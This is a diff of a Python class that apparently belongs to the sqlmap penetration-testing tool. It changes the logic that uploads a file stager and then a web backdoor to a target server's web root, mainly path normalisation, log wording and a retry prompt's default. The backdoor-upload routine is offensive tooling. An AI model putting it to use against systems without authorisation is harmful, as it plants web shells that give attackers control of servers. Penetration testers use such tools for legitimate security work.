@@ -198,9 +198,11 @@ class Web:
             for j in xrange(len(directories)):
                 docRoot = kb.docRoot[i]
                 directory = directories[j]
+                uriPath = ""
 
                 if not all(isinstance(item, basestring) for item in [docRoot, directory]):
                     continue
+
                 directory = ntToPosixSlashes(normalizePath(directory)).replace("//", "/").rstrip('/')
                 docRoot = ntToPosixSlashes(normalizePath(docRoot)).replace("//", "/").rstrip('/')
 
@@ -226,17 +228,14 @@ class Web:
                         else:
                             continue
 
-                uriPath = uriPath.replace("//", "/").rstrip('/')
-                localPath = localPath.rstrip('/')
-
-                if not uriPath:
-                    uriPath = '/'
+                localPath = os.path.normpath(localPath).rstrip('/')
+                uriPath = os.path.normpath(uriPath).rstrip('/')
 
                 # Upload the file stager
                 self.__webFileInject(stagerContent, stagerName, localPath)
 
                 self.webBaseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, uriPath)
-                self.webStagerUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), stagerName)
+                self.webStagerUrl = "%s/%s" % (self.webBaseUrl, stagerName)
 
                 uplPage, _ = Request.getPage(url=self.webStagerUrl, direct=True, raise404=False)
 
@@ -259,7 +258,7 @@ class Web:
                     kb.data.__VIEWSTATE = extractRegexResult(r"__VIEWSTATE[^>]+value=\"(?P<result>[^\"]+)\"", uplPage, re.I)
 
                 infoMsg = "the file stager has been successfully uploaded "
-                infoMsg += "on '%s' ('%s')" % (localPath, self.webStagerUrl)
+                infoMsg += "on '%s' - %s" % (localPath, self.webStagerUrl)
                 logger.info(infoMsg)
 
                 if self.webApi == "asp":
@@ -280,7 +279,7 @@ class Web:
 
                     if self.__webFileStreamUpload(backdoorStream, backdoorName, backdoorDirectory):
                         self.__webFileStreamUpload(runcmdStream, runcmdName, backdoorDirectory)
-                        self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl.rstrip('/'), backdoorName)
+                        self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                         self.webDirectory = backdoorDirectory
                     else:
                         continue
@@ -288,25 +287,30 @@ class Web:
                 else:
                     if not self.__webFileStreamUpload(backdoorStream, backdoorName, posixToNtSlashes(localPath) if Backend.isOs(OS.WINDOWS) else localPath):
                         warnMsg = "backdoor has not been successfully uploaded "
-                        warnMsg += "with file stager probably because of "
-                        warnMsg += "lack of write permission."
+                        warnMsg += "through the file stager possibly because "
+                        warnMsg += "the user running the web server process "
+                        warnMsg += "has not write privileges over the folder "
+                        warnMsg += "where the user running the DBMS process "
+                        warnMsg += "was able to upload the file stager or "
+                        warnMsg += "because the DBMS and web server sit on "
+                        warnMsg += "different servers"
                         logger.warn(warnMsg)
 
                         message = "do you want to try the same method used "
-                        message += "for the file stager? [y/N] "
-                        getOutput = readInput(message, default="N")
+                        message += "for the file stager? [Y/n] "
+                        getOutput = readInput(message, default="Y")
 
                         if getOutput in ("y", "Y"):
                             self.__webFileInject(backdoorContent, backdoorName, localPath)
                         else:
                             continue
 
-                    self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl.rstrip('/'), backdoorName)
+                    self.webBackdoorUrl = "%s/%s" % (self.webBaseUrl, backdoorName)
                     self.webDirectory = localPath
 
                 infoMsg = "the backdoor has probably been successfully "
-                infoMsg += "uploaded on '%s', go with your browser " % self.webDirectory
-                infoMsg += "to '%s' and enjoy it!" % self.webBackdoorUrl
+                infoMsg += "uploaded on '%s' - " % self.webDirectory
+                infoMsg += self.webBackdoorUrl
                 logger.info(infoMsg)
 
                 success = True
